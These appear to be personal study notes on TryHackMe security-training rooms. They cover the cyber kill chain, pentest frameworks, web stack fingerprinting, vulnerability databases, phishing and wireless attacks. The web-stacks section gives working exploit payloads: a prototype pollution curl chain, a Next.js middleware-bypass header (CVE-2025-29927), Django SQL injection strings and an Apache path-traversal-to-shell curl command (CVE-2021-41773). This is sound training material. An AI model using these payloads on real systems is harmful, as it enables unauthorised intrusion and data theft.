# Cyber Kill Chain
[LINK](https://tryhackme.com/room/cyberkillchain)


1. Reconnaissance: In the first stage, the attacker gathers information about the target
2. Weaponisation: Once proper reconnaissance is conducted, the attacker creates a deliverable payload or modifies an existing one based on the target system’s vulnerabilities
3. Delivery: Once ready, the attacker sends the weaponised payload to the target
4. Exploitation: Once executed, the payload exploits a vulnerability in the target’s system
5. Installation: The exploitation enables the attacker to install a backdoor or malware to maintain in the target’s environment
6. Command & Control (): Using the installed backdoor, the attacker can control the compromised system
7. Actions on Objectives: Reaching this far, the attacker can now carry out further actions such as data exfiltration or other systems’ exploitation


# Penetration Testing Frameworks
[LINK](https://tryhackme.com/room/penetrationtestingframeworks)

###  OSSTMM 
Open Source Security Testing Methodology Manual

### OWASP WSTG
Open Web Application Security Project - Web Security Testing Guide (WSTG)

### NIST SP 800-115
National Institute of Standards and Technology 

### PTES
Penetration Testing Execution Standard

### ISSAF
Information Systems Security Assessment Framework

### MITRE ATT&CK

### WASC Threat Classification
Web Application Security Consortium

### CSA Cloud Controls Matrix(CCM)
Cloud Security Alliance (CSA) 

### MASTG
OWASP Mobile Application Security Testing Guide

### PCI DSS Penetration Testing Guidelines
Payment Card Industry Data Security Standard

### CBEST Framework


# Content Discovery
[LINK](https://tryhackme.com/room/contentdiscoveryx)

**Virtual Hosts Discovery with gobuster**


# Modern Web Stacks
[LINK](https://tryhackme.com/room/modernwebstacks)


### MERN Stack

- **`X-Powered-By: Express`** header (main signal)
- **`connect.sid`** cookie (express-session)
- **Plain text error:** `Cannot GET /nonexistent`

#### The Vulnerability: Prototype Pollution
- Unsafe recursive `merge` function that doesn’t filter `__proto__` or `constructor.prototype`.
- Payload: `{"__proto__": {"isAdmin": true}}`

#### Exploitation Steps
1. **Save session cookie** → `curl -c cookies.txt http://target:3000/`
2. **Pollute prototype** →  
   `curl -b cookies.txt -X POST http://target:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'`
3. **Access protected admin endpoint** →  
   `curl -b cookies.txt http://target:3000/api/admin/flag`


### Next.js

- **`X-Powered-By: Next.js`** header  
- **HTML source contains `window.__next_f`** (definitive App Router indicator)  
- Static asset paths: `/_next/static/chunks/`  
- `x-nextjs-cache` and `x-nextjs-prerender` headers

> **Note:** Development mode (`next dev`) is **not** vulnerable. Production build (`npm run build && npm start`) is required.


#### CVE-2025-29927 – Middleware Authentication Bypass (CVSS 9.1 Critical)

**What it is:**  
Next.js uses an internal header `x-middleware-subrequest` to prevent infinite loops when middleware calls itself. The framework never validated if the header came from an internal process or an external client.

**Attack:**  
Send the header with your request to skip middleware entirely (bypass authentication, session checks, etc.).

**Payload format:**  
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://target/dashboard
```
- For root-level `middleware.ts` → `middleware` repeated 5 times
- For `src/middleware.ts` → `src/middleware` repeated 5 times

**Result:** Access protected routes (e.g., `/dashboard`) without login.


### Django

- **`Server: WSGIServer/0.2 CPython/...`** header  
- **`csrftoken`** cookie  
- **`X-Frame-Options: DENY`** + **`X-Content-Type-Options: nosniff`** together  
- **`csrfmiddlewaretoken`** hidden field in POST forms (most reliable)  
- Admin panel at `/admin/` (enabled by default)


#### CVE-2021-35042 – SQL Injection in `order_by()` (CVSS 9.8 Critical)

**What it is:**  
Django’s `order_by()` method concatenates user input directly into an `ORDER BY` clause when developers bypass the ORM and write raw SQL.

**Vulnerable pattern (example from text):**
```python
order = request.GET.get('order', 'name')
sql = f'... ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
```

**Attack vector:**  
Parameter `?order=` in the URL.

**Exploitation technique (MySQL with `DEBUG = True`):**  
Use `updatexml()` to leak data via error messages.

**Payloads:**
1. Get MySQL version:  
   `?order=updatexml(1,concat(0x7e,(select @@version)),1)`
2. Get database name:  
   `?order=updatexml(1,concat(0x7e,(select database())),1)`




### LAMP Stack – Short Note

- **`Server: Apache/2.4.49 (Unix)`** header  
- **404 error page footer** also shows version  
- **`/cgi-bin/`** returns **403 Forbidden** (not 404) → confirms `mod_cgi` is enabled

> Exact version 2.4.49 is vulnerable to CVE-2021-41773. 2.4.50 has a partial patch (bypassable via double encoding – CVE-2021-42013). 2.4.51+ patched.


#### CVE-2021-41773 – Path Traversal to RCE

**What it is:**  
Apache 2.4.49 flawed path normalization: `.%2e/` bypasses the `../` filter. When combined with `mod_cgi` on `/cgi-bin/`, you can execute arbitrary system commands.

**Why `--path-as-is` is required:**  
`curl` normalizes URLs by default (removes `.%2e/`). The flag forces curl to send the exact encoded path.

**Exploitation payload:**
```bash
curl -s --path-as-is "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; <command>'
```

**Breakdown:**
- `/.%2e/.%2e/.%2e/.%2e/` = traverse up 4 directories to filesystem root
- `/bin/sh` = execute shell
- POST body must include `echo Content-Type: text/plain; echo;` (CGI header requirement)


# Web Server Attacks - I
[LINK]()



### Common headers and their purpose

| Header | Protects against | Example value |
|--------|------------------|----------------|
| `X-Frame-Options` | Clickjacking (iframe embedding) | `DENY` or `SAMEORIGIN` |
| `X-Content-Type-Options` | MIME sniffing | `nosniff` |
| `Content-Security-Policy` | XSS, resource loading restrictions | `default-src 'self'` |
| `Referrer-Policy` | Referer header leakage | `no-referrer` |
| `Strict-Transport-Security` | Forces HTTPS (HTTPS only) | `max-age=31536000` |

> **Note:** `X-Frame-Options` is superseded by `Content-Security-Policy: frame-ancestors`. Modern sites may use CSP alone.
.

#### Quick audit command
```bash
for port in 80 8000 3000 8080; do
  curl -sI http://target:$port/ | grep -iE "x-frame-options|x-content-type|content-security-policy|strict-transport|referrer-policy"
done
```

### Nikto
```bash
nikto -h http://target:port -nointeractive
```
- `-nointeractive` suppresses prompts.


#### Tuning option (reduce noise)
```bash
nikto -h TARGET -Tuning 123
```
- `123` = common findings (concatenated, no commas)



# Understanding Vulnerability Databases
[LINK](https://tryhackme.com/room/understandingvulnerabilitydatabases)

#### Common Vulnerabilities and Exposures (CVE)

#### Common Vulnerability Scoring System (CVSS)

#### Common Platform Enumeration (CPE)

#### Common Weakness Enumeration (CWE)

#### CVE Numbering Authorities (CNAs)




# Basic Vulnerability Identification Techniques
[LINK](https://tryhackme.com/room/basicvulnerabilityidentificationtechniques)

#### Service Enumeration and Banner Grabbing

Service enumeration is the process of discovering which services are listening on a target's open ports and gathering enough detail about each to support further testing

Banner grabbing is the process of connecting to a service and reading its initial response

#### Matching Services to Known Exploits

searchsploit

Github

#### Identifying System and Network Vulnerabilities

Default and Weak Creds : hydra

SMB Misconfigurations : 

```
smbclient -L //10.48.173.5 -N
nmap --script smb2-security-mode -p 445 10.48.173.5
```

FTP Misconfigurations


# Phishing Basics
[LINK](https://tryhackme.com/room/phishingbasics)

Smishing, Vishing
Phishing, Spear phishing, Whaling

Tools : GoPhish, EvilNginx, SET



# Wireless Security
[LINK](https://tryhackme.com/room/wirelesssecurity)

#### Identifiers in Wi-Fi Networks
SSID (Service Set Identifier), BSSID (Basic Service Set Identifier)

#### Common WIFI attacks:
Password attacks, Rogue Access Points, Evil Twin Attacks, Deauthentication Attacks, Traffic Interception

#### Common RFID and NFC Security Risks
Eavesdropping, Cloning, Relay Attacks, Unauthorised Scanning (Skimming), Lost or Stolen Cards

#### Other Wireless Technologies
Zigbee, Z-Wave, LoRa, Cellular, Infrared

| Term | Definition |
|------|-------------|
| SSID | Service Set Identifier. The human-readable name of a Wi-Fi network. |
| BSSID | Basic Service Set Identifier. The MAC address of a wireless access point. |
| WEP | Wired Equivalent Privacy. The original Wi-Fi security protocol, now deprecated due to fundamental weaknesses in its RC4-based encryption that allow the network key to be recovered within minutes. |
| WPA | Wi-Fi Protected Access. An intermediate security protocol introduced as a replacement for WEP, using TKIP for encryption. Superseded by WPA2 and WPA3. |
| WPA2 | Wi-Fi Protected Access 2. A security protocol that uses encryption to protect Wi-Fi traffic. |
| WPA3 | Wi-Fi Protected Access 3. The successor to WPA2, introducing Simultaneous Authentication of Equals (SAE) to resist offline dictionary attacks. |
| MITM | Man-in-the-Middle. An attack in which an adversary secretly intercepts and potentially alters communication between two parties who believe they are communicating directly with each other. |
| SAE | Simultaneous Authentication of Equals. The key exchange mechanism used in WPA3 that replaces the four-way handshake with a more resistant authentication process. |
| BLE | Bluetooth Low Energy. A power-efficient variant of Bluetooth designed for devices that transmit small amounts of data intermittently. |
| SSP | Secure Simple Pairing. A Bluetooth pairing mechanism introduced in version 2.1 that uses Elliptic Curve Diffie-Hellman to protect against passive eavesdropping. |
| RFID | Radio-Frequency Identification. A technology that uses electromagnetic fields to identify and track tags attached to objects. |
| NFC | Near-Field Communication. A short-range wireless standard operating at 13.56 MHz that supports bidirectional communication between devices within approximately 5 cm. |
| Zigbee | A low-power, short-range mesh networking protocol used in smart home devices such as lights and sensors. |
| Z-Wave | A wireless protocol for home automation that uses a standardised frequency band and the S2 security framework for encrypted device communication. |
| LoRaWAN | Long Range Wide Area Network. A low-power wireless technology designed for transmitting small amounts of data over distances of several kilometres in IoT deployments. |
| Infrared | A wireless communication method that uses light signals for short-range, line-of-sight data transmission between a transmitter and receiver, commonly used in remote controls. |


# MetaSploit

## MetaSploit: Scanning and Exploitation
[LINK](https://tryhackme.com/room/metasploitscanningandexploitation)

Scanning with MetaSploit, The Metasploit Database, Vulnerability Scanning
